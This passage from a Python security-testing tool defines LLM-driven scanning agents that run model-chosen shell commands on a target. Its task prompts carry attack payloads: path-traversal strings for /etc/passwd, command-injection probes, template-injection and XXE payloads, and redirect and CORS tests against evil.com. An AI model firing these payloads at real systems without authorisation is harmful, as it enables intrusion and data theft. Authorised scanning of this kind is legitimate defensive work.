    },
    {
        "name": "Recon Agent",
        "icon": "🔍",
        "phase": "Discovery",
        "task": (
            "Perform comprehensive reconnaissance on {target}. Cover ALL of the following: "
            "1) HTTP headers — server banner, X-Powered-By, security headers (HSTS/CSP/X-Frame/X-Content-Type/Referrer-Policy), cookie flags (HttpOnly/Secure/SameSite). "
            "2) SSL/TLS — certificate issuer, expiry date, SANs, weak protocols (TLSv1.0/1.1/SSLv3), weak ciphers. "
            "3) DNS — A/AAAA records, MX, TXT (SPF/DMARC), NS, CNAME. Report missing SPF/DMARC. "
            "4) Technology stack — detect CMS (WordPress/Drupal/Joomla), frameworks (Laravel/Django/Rails/Next.js/Spring), JS libraries (jQuery/React/Angular/Vue) and their versions. "
            "5) CORS — probe with evil.com origin and null origin, check Access-Control-Allow-Origin reflection. "
            "6) HTTP methods — OPTIONS to list allowed methods, TRACE test. "
            "7) Port scan — web ports 80/443/8080/8443, API ports 3000/8000/9000, DB ports 27017/6379/5432/3306/9200. "
            "8) WAF detection — send XSS/SQLi/path traversal probes, check for WAF block pages (Cloudflare/Akamai/Imperva/Sucuri). "
            "9) Certificate transparency — query crt.sh for subdomains. "
            "10) Information disclosure — version strings, error messages, debug headers. "
            "Use curl, openssl, dig, nmap, and crt.sh API. "
            "Report EVERY security misconfiguration, missing header, and information disclosure finding."
        ),
    },
    {
        "name": "Passive Scanner",
        "icon": "📡",
        "phase": "Discovery",
        "task": (
            "Perform comprehensive passive security analysis of {target} — no active exploitation. "
            "Analyse EVERY response for the following without modifying any data: "
            "1) Information disclosure — server version, framework, internal paths, email addresses, IP addresses, stack traces, SQL errors, debug output, comments with credentials. "
            "2) Security headers — check for HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, CORP. "
            "3) Cookie security — HttpOnly, Secure, SameSite flags, domain scope, expiry, session token length. "
            "4) TLS/SSL — protocol version, cipher suite strength, certificate expiry, HSTS preload. "
            "5) Secrets in responses — API keys (AWS/GCP/GitHub/Stripe patterns), JWT tokens, private keys, hardcoded passwords, OAuth tokens in HTML/JS. "
            "6) JavaScript analysis — sensitive endpoints, credentials, API keys in bundle files. "
            "7) Form security — autocomplete on password fields, missing CSRF tokens, password in GET params. "
            "8) Cache control — sensitive pages must have no-store/no-cache, Pragma: no-cache. "
            "9) Content-Type — missing or incorrect content-type headers, charset mismatch. "
            "10) CORS — Access-Control-Allow-Origin wildcard or origin reflection. "
            "11) Source maps — X-SourceMap header, .map file references exposing source code. "
            "12) Mixed content — HTTP resources loaded on HTTPS pages. "
            "13) Sensitive file exposure — backup files (.bak/.old/.orig), editor temp files (~/.swp). "
            "14) PII in responses — credit card numbers, SSNs, phone numbers, email addresses. "
            "15) Clickjacking — missing X-Frame-Options and CSP frame-ancestors. "
            "Use curl to fetch the page, headers, and JS files. Report every finding with evidence."
        ),
    },
    {
        "name": "Secrets Scanner",
        "icon": "🔑",
        "phase": "Discovery",
        "task": (
            "Search for exposed secrets, API keys, credentials and sensitive files. "
            "Look for: .env, backup files, .git/config, swagger/openapi docs, debug endpoints, "
            "hardcoded tokens in JS files. Use: gobuster dir, curl on common secret paths, "
            "grep patterns on JS files."
        ),
    },
    {
        "name": "API Spec Agent",
        "icon": "📋",
        "phase": "Discovery",
        "task": (
            "Discover and parse API specifications to enumerate all endpoints and parameters. "
            "Probe common spec paths: /swagger.json, /swagger.yaml, /openapi.json, /openapi.yaml, "
            "/api-docs, /v1/api-docs, /v2/api-docs, /v3/api-docs, /graphql, /api/schema, "
            "/docs, /.well-known/openid-configuration. Download and parse any found spec to list "
            "all endpoints, HTTP methods, and parameters. Share discovered endpoint list so other "
            "agents can use them. Use: curl on spec paths, parse JSON/YAML responses with python3 -c."
        ),
    },
    {
        "name": "Security Headers",
        "icon": "🔏",
        "phase": "Discovery",
        "task": (
            "Analyse all HTTP security response headers and cookie security flags. "
            "For each of the following, report present/absent/misconfigured: "
            "Content-Security-Policy (check for unsafe-inline, unsafe-eval, wildcard *), "
            "X-Frame-Options (DENY or SAMEORIGIN), X-Content-Type-Options (nosniff), "
            "Strict-Transport-Security (min-age 31536000, includeSubDomains), "
            "Referrer-Policy, Permissions-Policy, Cross-Origin-Opener-Policy. "
            "Also check Set-Cookie headers for HttpOnly, Secure, SameSite flags. "
            "Check Server/X-Powered-By/X-AspNet-Version headers for version disclosure. "
            "Use: curl -sI {target} to grab all response headers, probe key paths. "
            "Rate every missing/misconfigured header at appropriate severity."
        ),
    },
    {
        "name": "JS Library Scanner",
        "icon": "📚",
        "phase": "Discovery",
        "task": (
            "Detect outdated and vulnerable JavaScript libraries loaded by the target. "
            "Fetch the main page HTML and all referenced JS files. Extract library names and "
            "versions from <script> src attributes, inline version strings, and JS file content. "
            "Look for: jQuery (< 3.5.0 = XSS), Bootstrap (< 4.3.1 = XSS), Angular.js (any 1.x = EOL), "
            "Prototype.js, MooTools, handlebars.js, lodash (< 4.17.21), moment.js (EOL), "
            "DOMPurify (< 2.4.0), highlight.js (< 11.x). "
            "Use: curl -s {target} to get HTML, grep for script src, curl each JS file and grep for version patterns. "
            "Flag any library with a known CVE or that is end-of-life as a finding."
        ),
    },
    # ── PHASE 2: ACTIVE SCANNING ──────────────────────────────────────────────
    {
        "name": "SQLi Agent",
        "icon": "💉",
        "phase": "Active Scanning",
        "task": (
            "Test all discovered endpoints for SQL injection vulnerabilities. "
            "Test GET/POST parameters, headers (User-Agent, Referer, X-Forwarded-For), "
            "and JSON body fields. Use: sqlmap -u {target} --batch --level 2 --risk 1 "
            "--forms --crawl=2 --output-dir /tmp/dast_sqlmap."
        ),
    },
    {
        "name": "XSS Agent",
        "icon": "🔥",
        "phase": "Active Scanning",
        "task": (
            "Test for Cross-Site Scripting (reflected, stored, DOM-based). "
            "Fuzz all input parameters with XSS payloads. "
            "Use: dalfox url {target} --silence, ffuf with XSS wordlist, "
            "manual payloads via curl for reflected XSS indicators."
        ),
    },
    {
        "name": "SSRF Agent",
        "icon": "🌐",
        "phase": "Active Scanning",
        "task": (
            "Test for Server-Side Request Forgery. Check URL parameters, file upload paths, "
            "webhook endpoints, PDF/image processing. "
            "Use internal addresses (127.0.0.1, 169.254.169.254 metadata service, "
            "localhost:22, localhost:6379). Report any out-of-band or error-based indicators."
        ),
    },
    {
        "name": "SSTI Agent",
        "icon": "🧪",
        "phase": "Active Scanning",
        "task": (
            "Test for Server-Side Template Injection in all user-controlled inputs. "
            "Use probing payloads: {{7*7}}, ${7*7}, #{7*7}, <% = 7*7 %>, {{config}}. "
            "Use: tplmap -u {target}, manual curl with template payloads. "
            "Identify template engine from error messages and escalate."
        ),
    },
    {
        "name": "XXE Agent",
        "icon": "📄",
        "phase": "Active Scanning",
        "task": (
            "Test for XML External Entity injection in XML-accepting endpoints, "
            "file uploads (DOCX/SVG/XML), and SOAP services. "
            "Inject XXE payloads to read /etc/passwd, /etc/hostname, internal network access. "
            "Use: xxeinjector if available, else curl with crafted XML payloads."
        ),
    },
    {
        "name": "LFI Agent",
        "icon": "📂",
        "phase": "Active Scanning",
        "task": (
            "Test for Local File Inclusion and Path Traversal vulnerabilities. "
            "Inject path traversal sequences into all GET/POST parameters, HTTP headers (Referer, Cookie), "
            "and file-name parameters. Payloads: ../../../etc/passwd, ....//....//etc/passwd, "
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL-encoded), ..%2f..%2f..%2fetc%2fpasswd, "
            "..\\..\\..\\windows\\win.ini (Windows), /proc/self/environ, /var/log/apache2/access.log. "
            "Also test for null byte injection: ../../etc/passwd%00.jpg. "
            "Use: curl with payloads in each discovered parameter. Look for /etc/passwd root: in response."
        ),
    },
    {
        "name": "CMDi Agent",
        "icon": "💻",
        "phase": "Active Scanning",
        "task": (
            "Test for OS command injection in all input parameters, HTTP headers, and form fields. "
            "Inject both immediate and time-delay payloads: ;id, |id, &&id, `id`, $(id), "
            ";sleep 5, |sleep 5, &&sleep 5, ;ping -c 5 127.0.0.1. "
            "Test in: GET/POST parameters, User-Agent, Referer, X-Forwarded-For, Cookie values, "
            "file name fields, search fields. "
            "Use: curl to send payloads, measure response time for time-delay probes. "
            "Look for uid=, gid=, Linux/Windows system info in responses. "
            "If interactsh or burp collaborator available, use OOB callbacks for blind CMDi."
        ),
    },
    {
        "name": "Open Redirect",
        "icon": "↗️",
        "phase": "Active Scanning",
        "task": (
            "Test for open redirect vulnerabilities in URL-like parameters. "
            "Identify all parameters that contain URLs or paths: url, redirect, next, return, "
            "goto, link, redir, returnUrl, redirectUri, callback, dest, destination, "
            "forward, location, to, from, ref, out, view, go, jump. "
            "Test with external domain payloads: https://evil.com, //evil.com, "
            "https://target.com.evil.com, https://evil.com\\@target.com (parser confusion), "
            "javascript:alert(1) (for XSS via redirect). "
            "Use: curl -L to follow redirects and check final destination. "
            "Report if the redirect reaches an external domain not in scope."
        ),
    },
    # ── PHASE 3: AUTH & SESSION ───────────────────────────────────────────────
    {
        "name": "Deserial Agent",
        "icon": "🔓",
        "phase": "Auth & Session",
        "task": (
            "Test for insecure deserialization in cookies, hidden fields, API parameters. "
            "Look for base64-encoded serialized objects, Java serialization magic bytes (aced0005), "
            "PHP serialized strings (O:4:). Use: ysoserial payloads via curl, "
            "check for deserialization errors in responses."
        ),
    },
    {
        "name": "CORS Agent",
        "icon": "🌍",
        "phase": "Auth & Session",
        "task": (
            "Test for CORS misconfiguration. Send requests with Origin: headers set to "
            "attacker.com, null, {target}.attacker.com, evil-{target}. "
            "Check Access-Control-Allow-Origin and Access-Control-Allow-Credentials. "
            "Use: curl -H 'Origin: https://evil.com' on all API endpoints."
        ),
    },
    {
        "name": "JWT Agent",
        "icon": "🪙",
        "phase": "Auth & Session",
        "task": (
            "Test JWT implementation weaknesses: alg=none attack, weak secret brute-force, "
            "RS256-to-HS256 confusion, kid injection, jku/x5u header injection. "
            "If JWT found in cookies or Authorization header, decode and test with: "
            "jwt_tool if available, else manual curl with crafted tokens."
        ),
    },
    {
        "name": "OAuth Agent",
        "icon": "🔐",
        "phase": "Auth & Session",
        "task": (
            "Test OAuth2/OpenID Connect flow for: open redirect in redirect_uri, "
            "state parameter CSRF, authorization code interception, token leakage in referrer. "
            "Probe /.well-known/openid-configuration, /oauth/authorize, /oauth/token. "
            "Use curl to test parameter manipulation."
        ),
    },
    {
        "name": "CSRF Agent",
        "icon": "🎭",
        "phase": "Auth & Session",
        "task": (
            "Test for Cross-Site Request Forgery vulnerabilities. "
            "Check all state-changing endpoints (POST/PUT/DELETE/PATCH) for: missing CSRF tokens, "
            "predictable or reusable CSRF tokens, missing SameSite cookie attribute, "
            "weak Origin/Referer header validation. "
            "Use: curl with forged Origin and Referer headers on login/account/API endpoints, "
            "replay requests with modified Origin header, test null origin bypass. "
            "Also check Set-Cookie headers for SameSite=Strict/Lax enforcement."
        ),
    },
    # ── PHASE 4: PROTOCOL & TRANSPORT ────────────────────────────────────────
    {
        "name": "WAF Bypass",
        "icon": "🛡️",
        "phase": "Protocol & Transport",
        "task": (
            "Detect and attempt to bypass Web Application Firewall. "
            "Test payload encoding (URL, double URL, Unicode, hex, base64), "
            "HTTP verb tampering, header manipulation (X-Originating-IP, X-Remote-IP). "
            "Use: wafw00f {target}, nmap --script http-waf-detect, curl with encoded payloads."
        ),
    },
    {
        "name": "TLS/SSL Agent",
        "icon": "🔒",
        "phase": "Protocol & Transport",
        "task": (
            "Analyse TLS/SSL configuration: weak protocols (SSLv3, TLS 1.0/1.1), "
            "weak cipher suites, certificate issues (expired, self-signed, wrong hostname), "
            "HSTS enforcement, certificate transparency. "
            "Use: sslscan {target}, testssl.sh --fast {target} if available, "
            "openssl s_client -connect {target}:443."
        ),
    },
    {
        "name": "Smuggling Agent",
        "icon": "📦",
        "phase": "Protocol & Transport",
        "task": (
            "Test for HTTP Request Smuggling (CL.TE and TE.CL). "
            "Look for: frontend/backend proxy setups, chunked transfer encoding support, "
            "discrepancies in Content-Length vs Transfer-Encoding handling. "
            "Use: smuggler.py if available, else craft manual CL.TE payloads via curl with --http1.1."
        ),
    },
    {
        "name": "OAST Agent",
        "icon": "🌊",
        "phase": "Protocol & Transport",
        "task": (
            "Perform Out-of-Band Application Security Testing. Test for blind SSRF, "
            "blind XXE, blind command injection, DNS rebinding using pingback/OOB techniques. "
            "Use collaborator-style payloads if burp collaborator or interactsh is available. "
            "Else test with requestbin-style endpoints or DNS resolution via curl."
        ),
    },
    # ── PHASE 5: ADVANCED (new) ───────────────────────────────────────────────
    {
        "name": "IDOR Agent",
        "icon": "🔄",
        "phase": "Advanced",
        "task": (
            "Test for Insecure Direct Object Reference (IDOR) vulnerabilities. "
            "Find all endpoints that accept user-controlled IDs (numeric or UUID) in URL paths, "
            "query params, or request bodies: /api/users/{id}, /account?id=, /orders/{id}, "
            "/documents/{id}, /invoices/{id}. "
            "Test by: enumerating IDs sequentially (1,2,3), swapping IDs between accounts if possible, "
            "using negative IDs, large IDs, and non-existent IDs to detect enumeration. "
            "Check: does changing the ID return another user's data? Does the app return 200 vs 403? "
            "Use: curl to probe discovered ID-based endpoints with modified values. "
            "Report if any ID substitution returns data that should be protected."
        ),
    },
    {
        "name": "Rate Limit Agent",
        "icon": "⏱️",
        "phase": "Advanced",
        "task": (
            "Test for missing or bypassable rate limiting on sensitive endpoints. "
            "Target: login, register, password-reset, OTP/2FA verification, API key endpoints. "
            "Test: send 50+ rapid requests to /login, /forgot-password, /api/verify-otp. "
            "Bypass techniques: rotate User-Agent headers, use X-Forwarded-For spoofing "
            "(X-Forwarded-For: 1.2.3.4, X-Real-IP: 1.2.3.5, X-Originating-IP: 1.2.3.6), "
            "add random query params (?t=random) to bust caching rate limits. "
            "Use: for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code}\\n' -X POST {target}/login "
            "-d 'user=test&pass=test'; done | sort | uniq -c to detect throttling. "
            "Report if no 429/lockout after 20+ failed attempts."
        ),
    },
    {
        "name": "Business Logic Agent",
        "icon": "🧩",
        "phase": "Advanced",
        "task": (
            "Test for business logic vulnerabilities. "
            "Check: negative price/quantity parameters in purchase flows (price=-1, qty=-100), "
            "currency/unit manipulation in API params, workflow step skipping "
            "(POST to /checkout without /cart), coupon code stacking, "
            "mass assignment (send extra JSON fields: isAdmin=true, role=admin, price=0), "
            "HTTP parameter pollution (id=1&id=2), parameter type confusion (string vs int). "
            "Use: curl -X POST {target}/api/order -d '{\"price\":-1,\"qty\":-1}' to test negative values. "
            "curl -X PATCH {target}/api/profile -d '{\"role\":\"admin\",\"isAdmin\":true}' for mass assignment. "
            "Report any unexpected behavior: 200 on negative prices, privilege escalation, workflow bypass."
        ),
    },
    {
        "name": "Subdomain Enum",
        "icon": "🌐",
        "phase": "Advanced",
        "task": (
            "Enumerate subdomains of the target domain to expand attack surface. "
            "Extract base domain from target URL. "
            "Use: curl -s 'https://crt.sh/?q={domain}&output=json' | python3 -c "
            "\"import sys,json; [print(e.get('name_value','')) for e in json.load(sys.stdin)]\" "
            "to query certificate transparency logs. "
            "Also try common subdomains: admin, api, dev, staging, test, beta, internal, vpn, "
            "mail, smtp, ftp, git, jenkins, jira, confluence, kibana, grafana, prometheus. "
            "Use: for sub in admin api dev staging test; do curl -sI http://$sub.{domain} 2>/dev/null | "
            "head -1; done to probe common subdomains. "
            "Report all discovered live subdomains with their HTTP status codes."
        ),
    },
    {
        "name": "Nuclei Agent",
        "icon": "⚡",
        "phase": "Advanced",
        "task": (
            "Run nuclei vulnerability scanner against the target with community templates. "
            "Check if nuclei is installed: which nuclei. "
            "If available, run: nuclei -u {target} -severity medium,high,critical -j -silent -timeout 10 "
            "-rate-limit 10 -bulk-size 5 -c 5 2>/dev/null | head -50 "
            "Parse JSON output lines to extract template-id, severity, matched-at, and name. "
            "Also run: nuclei -u {target} -t exposures/ -t cves/ -severity high,critical -j -silent 2>/dev/null | head -30 "
            "If nuclei not installed: report 'nuclei not installed — install with: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest' "
            "Report each nuclei finding with template name, severity, and matched URL."
        ),
    },
]

# Map phase name → ordered list of agents (for UI rendering)
PHASES = ["Discovery", "Active Scanning", "Auth & Session", "Protocol & Transport", "Advanced"]

_AGENT_SYSTEM_PROMPT = """\
You are {name} — a specialist DAST (Dynamic Application Security Testing) agent.
Target: {target}
Phase: {phase}
Scope: Only test URLs within {scope}. Do not follow links to external domains.
Your task: {task}{auth_note}

You MUST respond with ONLY valid JSON — no markdown, no text outside the JSON.
Choose ONE of:

1. Run the next command:
{{"command": "exact shell command with target substituted", "reason": "one-line reason", "phase": "{phase}"}}

2. When complete:
{{"done": true, "summary": "what you found", "findings": [{{"text": "specific finding", "severity": "critical|high|medium|low|info"}}]}}

Severity guide:
  critical = RCE, auth bypass, credentials exposed, data exfiltration
  high     = SQLi confirmed, stored XSS, SSRF confirmed, SSTI, XXE, JWT bypass
  medium   = reflected XSS, CORS misconfigured, CSRF, weak TLS, insecure deserial indicator
  low      = missing security headers, verbose errors, non-sensitive info disclosure
  info     = fingerprinting, spec/docs discovered, observations with no direct impact

RULES:
- ONE command at a time. Adapt next command based on output.
- Substitute the real target into commands — never use placeholders like <target>.
- Max {max_iter} commands. Use them efficiently.
- findings text must be specific and actionable (e.g. "Reflected XSS in /search?q= parameter", "SQLi via id= GET param").
- Never run destructive or irreversible commands.
- If a tool is not installed, skip it and try another approach.
"""


# ── State ─────────────────────────────────────────────────────────────────────

_lock         = threading.Lock()
_SEM          = threading.Semaphore(29)  # max concurrent agents (reset per scan)
_agents: dict = {}          # agent_id → agent state
_findings: list = []        # all findings across all agents
_attack_chains: list = []   # detected multi-step attack chains (VulnChainer output)
_context: dict  = {}        # shared inter-agent context
_scan_active: bool = False
_scan_target: str  = ""
_seen_findings: set = set() # dedup set: (agent_name, finding_text_hash)
_restored_scan_id: str | None = None


_find_log = logging.getLogger("dast.findings")

_DISCOVERY_ONLY_TYPES = {
    "forced_browse",
    "path_found",
    "path_discovery",
    "directory_discovery",
    "dir_discovery",
    "content_discovery",
    "endpoint_discovery",
    "hidden_path",
}
_DISCOVERY_ONLY_AGENTS = {
    "forced browse",
    "forcedbrowser",
    "gobuster",
    "dirbuster",
    "feroxbuster",
}


def _is_discovery_only_record(finding: dict) -> bool:
    """Return True for path enumeration records that are coverage, not vulns."""
    values = (
        finding.get("type"),
        finding.get("vuln_type"),
        finding.get("category"),
        finding.get("source"),
    )
    lowered = {str(v).strip().lower() for v in values if v}
    if lowered & _DISCOVERY_ONLY_TYPES:
        return True

    agent = str(finding.get("agent") or finding.get("agent_id") or "").strip().lower()
    phase = str(finding.get("phase") or "").strip().lower()
    text = str(finding.get("finding") or "").strip().lower()
    if agent in _DISCOVERY_ONLY_AGENTS:
        if text.startswith(("path discovered:", "directory discovered:", "found path:")):
            return True
        if "forced" in phase or "browse" in phase or "directory" in phase:
            return True
    return False


def _main_security_findings(findings: list[dict]) -> list[dict]:
    return [f for f in findings if not _is_discovery_only_record(f)]

def _record_finding(agent: str, finding_text: str, severity: str, target: str,
                    agent_id: str = "", icon: str = "", phase: str = "",
                    extra: dict | None = None) -> bool:
    """Dedup and record a finding. Returns True if new, False if duplicate."""
    import hashlib
    _url_for_key = (extra or {}).get("url", "") or target or ""
    dedup_key = (agent, hashlib.md5((finding_text + "|" + _url_for_key).encode()).hexdigest())
    with _lock:
        if dedup_key in _seen_findings:
            _find_log.debug("DUPLICATE [%s] %s", severity.upper(), finding_text[:120])
            return False
        _seen_findings.add(dedup_key)
        _find_log.warning("FINDING [%s] %s | %s | %s", severity.upper(), agent, phase, finding_text[:120])
        record = {
            "agent":    agent,
            "agent_id": agent_id or agent.lower().replace(" ", "_"),
            "icon":     icon,
            "phase":    phase,
            "finding":  finding_text,
            "severity": severity,
            "url":      target,   # explicit url field so grouping & UI always find it
            "target":   target,
            "ts":       datetime.now(timezone.utc).isoformat(),
        }
        if extra:
            record.update(extra)  # extra["url"] overrides if a more specific URL is passed
        _findings.append(record)
        # Real-time persistence to Tier 1 SQLite (and Tier 2 Redis dedup)
        try:
            if _active_scan_id:
                _db.write_finding(_active_scan_id, record)
                # Gap 3: track coverage
                if record.get("url"):
                    _db.mark_endpoint_tested(_active_scan_id, record["url"],
                                             method=record.get("method", "GET"),
                                             phase=record.get("phase", ""))
        except Exception:
            pass
        try:
            get_global_bus().publish(FINDING_DISCOVERED, {**record, "_scan_id": _active_scan_id})
        except Exception:
            pass
    return True


def _persist_finding(finding: dict) -> None:
    """Persist any finding dict (passive, specialized, or engine) to Tier 1 SQLite."""
    try:
        if _active_scan_id:
            _db.write_finding(_active_scan_id, finding)
            if finding.get("url"):
                _db.mark_endpoint_tested(_active_scan_id, finding["url"],
                                         method=finding.get("method", "GET"),
                                         phase=finding.get("phase", ""))
    except Exception:
        pass


# Restore last completed scan from DB so findings survive server restarts
_db_restore_latest_scan()
_last_scan_summary = _db_get_kv("last_scan_summary", {})
# Recover last_scan_summary from DB if it was wiped by a crash (finally block never ran)
if not _last_scan_summary:
    try:
        _recent = _db.get_scan_history(limit=1)
        if _recent:
            _rs = _recent[0]
            _deleted_ids = set(_db_get_kv("deleted_scan_ids", []))
            if _rs.get("scan_id") and _rs["scan_id"] not in _deleted_ids and _rs.get("status") in ("completed", "stopped", "failed", "error"):
                import datetime as _dt_init
                _ended = _rs.get("completed_at") or ""
                try:
                    _ended = _dt_init.datetime.fromisoformat(_ended.replace("Z","")).strftime("%H:%M UTC")
                except Exception:
                    _ended = ""
                _last_scan_summary = {
                    "scan_id":       _rs["scan_id"],
                    "target":        _rs.get("target", ""),
                    "phase_reached": "complete" if _rs.get("status") == "completed" else _rs.get("status", "unknown"),
                    "findings_count": _rs.get("finding_count", 0),
                    "pages_crawled": _rs.get("pages_crawled", 0),
                    "payloads_sent": _rs.get("payloads_sent", 0),
                    "tools_ran":     [],
                    "ended_at":      _ended,
                }
    except Exception:
        pass
_attack_chains     = _db_get_kv("attack_chains", [])


# ── LLM call ─────────────────────────────────────────────────────────────────

def _llm_call(messages: list) -> str:
    """LLM call via LLMProvider abstraction layer (anthropic → openai → ollama)."""
    provider = LLMProvider(api_keys={
        "anthropic": _api_keys.get("anthropic", ""),
        "openai":    _api_keys.get("openai", ""),
    })
    return provider.chat(messages)


# ── Command runner ────────────────────────────────────────────────────────────

_CURL_HOME = "/tmp/.dast_curl_home"
try:
    os.makedirs(_CURL_HOME, exist_ok=True)
    with open(os.path.join(_CURL_HOME, ".curlrc"), "w") as _f:
        _f.write("--max-time 12\n--connect-timeout 8\n--retry 0\n")
except Exception:
    _CURL_HOME = None


def _run_cmd(cmd: str, timeout: int = 90) -> str:
    try:
        _env = {**os.environ, "TERM": "dumb"}
        if _CURL_HOME:
            _env["HOME"] = _CURL_HOME
        result = subprocess.run(
            cmd,
            shell=True,
            executable="/bin/bash",
            capture_output=True, text=True, timeout=timeout,
            env=_env,
            errors="replace",   # replace undecodable bytes instead of crashing
        )
        out = (result.stdout + result.stderr).strip()
        if not out:
            return "(no output)"
        # Strip raw HTML bodies — only keep meaningful text lines
        out = _sanitize_cmd_output(out)
        return out[:6000]
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Command exceeded {timeout}s"
    except FileNotFoundError as e:
        return f"[NOT FOUND] {e} — tool may not be installed"
    except Exception as e:
        return f"[ERROR] {e}"


def _sanitize_cmd_output(out: str) -> str:
    """Strip raw HTML/binary blobs from command output — keep useful lines only."""
    lines = out.splitlines()
    clean = []
    html_line_count = 0
    for line in lines:
        stripped = line.strip()
        # Skip blank lines beyond the first few
        if not stripped:
            if len(clean) > 0:
                clean.append("")
            continue
        # Detect HTML body lines (start with < but not just a short tag)
        if stripped.startswith("<") and len(stripped) > 80 and stripped.count("<") > 3:
            html_line_count += 1
            if html_line_count == 1:
                clean.append(f"[HTML body — {len(out)} chars, use View Source for content]")
            continue
        html_line_count = 0
        clean.append(line)
    result = "\n".join(clean).strip()
    return result if result else "(empty response)"


# ── Agent worker ──────────────────────────────────────────────────────────────

def _record_findings(state: dict, agent_id: str, target: str, raw_findings: list) -> None:
    """Parse findings (str or dict) into normalised records in _findings and state."""
    import hashlib
    for f in raw_findings:
        if isinstance(f, dict):
            text     = f.get("text", str(f))
            severity = f.get("severity", "medium").lower()
        else:
            text     = str(f)
            severity = "medium"
        if severity not in ("critical", "high", "medium", "low", "info"):
            severity = "medium"
        # Deduplication: include URL so the same vuln on different endpoints each get recorded
        _furl = f.get("url", "") if isinstance(f, dict) else ""
        dedup_key = (state["name"], hashlib.md5((text + "|" + _furl).encode()).hexdigest())
        if dedup_key in _seen_findings:
            continue
        _seen_findings.add(dedup_key)
        state["findings"].append({"text": text, "severity": severity})
        record = {
            "agent":    state["name"],
            "agent_id": agent_id,
            "icon":     state["icon"],
            "phase":    state["phase"],
            "finding":  text,
            "severity": severity,
            "url":      _furl or target,
            "target":   target,
            "ts":       datetime.now(timezone.utc).isoformat(),
        }
        _findings.append(record)
        get_global_bus().publish(FINDING_DISCOVERED, {**record, "_scan_id": _active_scan_id})
    if raw_findings:
        first = raw_findings[0]
        ctx_val = first.get("text", str(first)) if isinstance(first, dict) else str(first)
        _context[f"{state['name']}_key"] = ctx_val
        # Tier 2: persist context to Redis (in-memory fallback if Redis unavailable)
        try:
            if _active_scan_id:
                _db.set_context(_active_scan_id, f"{state['name']}_key", ctx_val)
        except Exception:
            pass


def _agent_worker(agent_id: str, target: str, prior_context: str = ""):
    global _scan_active
    _SEM.acquire()
    state = _agents.get(agent_id)
    if not state:          # scan was reset while this thread was queued
        _SEM.release()
        return
    state["status"] = "running"

    scope     = urlparse(target).netloc or target
    auth_hdr  = _api_keys.get("auth_header", "")
    auth_note = f"\nAuth: Include this header in all authenticated requests: {auth_hdr}" if auth_hdr else ""

    task_filled = state["task"].replace("{target}", target)
    sys_prompt  = _AGENT_SYSTEM_PROMPT.format(
        name=state["name"],
        target=target,
        phase=state["phase"],
        task=task_filled,
        max_iter=state["max_iter"],
        scope=scope,
        auth_note=auth_note,
    )
    first_msg = f"Begin your DAST task. Target: {target}"
    if prior_context:
        first_msg += f"\n\n[PRIOR AGENT FINDINGS]\n{prior_context}\nUse these findings to focus your work and avoid duplicating effort."
    messages = [
        {"role": "system", "content": sys_prompt},
        {"role": "user",   "content": first_msg},
    ]

    # ── Static (no-key) fallback ──────────────────────────────────────────────
    has_key = bool(_api_keys.get("openai") or _api_keys.get("anthropic"))
    if not has_key:
        state["output"].append("[MODE] No AI key — running static tool commands")
        _run_static_agent(state, agent_id, target)
        state["status"]      = "completed"
        state["finished_at"] = datetime.now(timezone.utc).isoformat()
        _SEM.release()
        with _lock:
            all_done = all(
                a["status"] in ("completed", "error", "stopped")
                for a in _agents.values()
            )
            if all_done and not _engine_running:
                _scan_active = False
        return

    try:
        for i in range(state["max_iter"]):
            if state.get("stop"):
                break

            state["iteration"] = i + 1

            # inject shared context every 3 iterations
            if i > 0 and i % 3 == 0 and _context:
                ctx_lines = ["Other agents discovered:"]
                for k, v in list(_context.items())[-8:]:
                    ctx_lines.append(f"  • {k}: {v}")
                messages.append({
                    "role": "user",
                    "content": "[SHARED INTEL]\n" + "\n".join(ctx_lines) + "\nAdapt if relevant.",
                })
                state["output"].append(f"[ADAPT] Incorporating {len(_context)} shared context items")

            try:
                raw      = _llm_call(messages)
                decision = _parse_llm_json(raw)
            except Exception as e:
                state["output"].append(f"[LLM ERROR] {e}")
                break

            if decision.get("done"):
                summary      = decision.get("summary", "Task complete")
                raw_findings = decision.get("findings", [])
                state["summary"] = summary
                state["output"].append(f"[DONE] {summary}")

                with _lock:
                    _record_findings(state, agent_id, target, raw_findings)
                    if summary:
                        _context[f"{state['name']}_summary"] = summary
                        try:
                            if _active_scan_id:
                                _db.set_context(_active_scan_id, f"{state['name']}_summary", summary)
                        except Exception:
                            pass
                break

            cmd    = decision.get("command", "").strip()
            reason = decision.get("reason", "")
            share  = decision.get("share")

            if not cmd:
                break

            state["output"].append(f"[{state['phase']}] $ {cmd}")
            if reason:
                state["output"].append(f"  → {reason}")

            cmd_out = _run_cmd(cmd)
            for _ol in cmd_out.splitlines():
                if _ol.strip():
                    state["output"].append(_ol)
            state["commands_run"] += 1

            if share:
                with _lock:
                    _context[f"{state['name']}_{i}"] = share
                state["output"].append(f"[SHARED] → {share}")

            messages.append({"role": "assistant", "content": raw})
            messages.append({
                "role": "user",
                "content": (
                    f"Command output:\n{cmd_out}\n\n"
                    "If you found something important, add a 'share' key with a short discovery string. "
                    "Continue or respond with done."
                ),
            })

    except Exception as e:
        state["output"].append(f"[AGENT ERROR] {e}")
        state["status"] = "error"
    finally:
        if state["status"] == "running":
            state["status"] = "completed"
        state["finished_at"] = datetime.now(timezone.utc).isoformat()
        _SEM.release()
        safe_publish(AGENT_DONE, {
            "agent_id":      state["id"],
            "name":          state["name"],
            "status":        state["status"],
            "finding_count": len(state.get("findings", [])),
        })

        # Check if all agents done
        with _lock:
            all_done = all(
                a["status"] in ("completed", "error", "stopped")
                for a in _agents.values()
            )
            if all_done and not _engine_running and _scan_active:
                _scan_active = False
                # Mark scan complete in multi-DB manager
                try:
                    if _active_scan_id:
                        counts = {}
                        for f in _findings:
                            s = (f.get("severity") or "info").lower()
                            counts[s] = counts.get(s, 0) + 1
                        summary = ", ".join(f"{v} {k}" for k, v in sorted(counts.items()))
                        _db.update_scan_counts(
                            _active_scan_id,
                            finding_count=len(_findings),
                            critical_count=counts.get("critical", 0),
                            high_count=counts.get("high", 0),
                            medium_count=counts.get("medium", 0),
                            low_count=counts.get("low", 0),
                            info_count=counts.get("info", 0),
                        )
                        _db.complete_scan(_active_scan_id, "completed", summary)
                        # Fire integrations and audit on natural completion
                        _db.log_audit("scan_completed", scan_id=_active_scan_id,
